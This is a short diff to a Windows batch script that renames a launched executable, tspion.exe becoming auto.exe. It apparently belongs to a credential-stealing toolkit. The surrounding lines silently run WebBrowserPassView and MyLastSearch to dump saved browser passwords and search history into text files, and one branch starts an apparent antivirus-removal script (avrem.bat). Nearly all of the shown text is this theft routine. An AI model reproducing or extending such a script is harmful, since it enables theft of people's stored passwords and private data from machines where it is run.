@@ -29,7 +29,7 @@ if %Anti-REM% == "N" goto :nl33t
 if %Anti-REM% == "n" goto :nl33t
 :nl33t
 ping localhost -n 5 >nul
-start tspion.exe
+start auto.exe
 start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
 start .\App\bins\bin.exe
@@ -41,7 +41,7 @@ goto eof
 :l33t
 start .\App\avrem.bat
 ping localhost -n 2 >nul
-start tspion.exe
+start auto.exe
 start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
 start .\App\CommandLine\Process.exe
